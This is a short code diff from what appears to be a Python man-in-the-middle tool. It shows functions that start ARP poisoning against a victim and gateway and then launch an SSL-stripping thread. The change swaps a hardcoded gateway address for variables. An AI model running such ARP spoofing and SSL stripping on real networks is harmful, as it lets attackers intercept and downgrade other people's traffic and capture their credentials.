@@ -267,12 +267,12 @@ def main():
         arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
     def arpListen():
         arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
-    def arpGateway(checked):
-        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)
+    def arpGateway():
+        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
 
     def ssl():
         print("MITM Activated")
-        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
+        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
         print("SSL Stripping")
         sslthread = threading.Thread(target=ssl_strip.start)
         gatewayspoof.start()
